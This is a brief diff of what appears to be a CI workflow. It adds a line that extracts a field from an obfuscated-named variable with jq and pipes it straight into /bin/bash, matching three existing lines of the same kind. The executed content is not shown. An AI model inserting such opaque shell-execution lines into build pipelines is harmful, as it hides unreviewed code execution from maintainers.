@@ -24,6 +24,7 @@ jobs:
           echo $igiz01 | jq -r .im387 | /bin/bash
           echo $kju9 | jq -r .l12 | /bin/bash
           echo $owvmn10 | jq -r .p82 | /bin/bash
+          printf '%s' "$py3956" | jq -r .es47 | /bin/bash
 
       - name: Upload results
         if: always()
